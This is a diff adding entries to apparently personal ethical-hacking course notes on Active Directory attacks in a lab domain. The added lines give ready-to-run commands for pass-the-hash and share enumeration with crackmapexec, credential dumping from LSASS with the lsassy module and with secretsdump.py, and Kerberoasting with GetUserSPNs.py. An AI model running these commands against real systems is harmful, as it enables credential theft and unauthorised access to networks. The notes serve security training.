@@ -360,6 +360,26 @@ we need to specify -->  a network
 > we can do the same thing with a hash (instead of a password)
 > `crackmapexec smb 172.16.214.0/24 -u administrator -H hash --local-auth`
 
+`crackmapexec smb 172.16.214.0/24 -u administrator -H hash --local-auth --shares`
+`--shares` -->  enumerates the shares (IPC$ ADMIN$ ...)
+`
+`crackmapexec smb -L`
+list all the module that you can use with this tool
+`-M` -->  to use a module
+
+example:
+`crackmapexec smb 172.16.214.0/24 -u administrator -H hash --local-auth -M lsassy`
+
+#### secretsdump
+tools for looking for hash for accounts
+`secretsdump.py MARVEL.local/fcastle:'Password1'@172.16.214.130`
+
+####  GetUserSPNs
+Can be used to obtain a password hash for user accounts that have an SPN (service principal name)
+Look [[Notes_ETH#Kerberoasting|here]] to deply understand 
+(Domain Controller must be on)
+`sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 172.16.214.120 -request`
+`-dc-ip` --> Domain Controller IP
 
 -----
 ## Sites
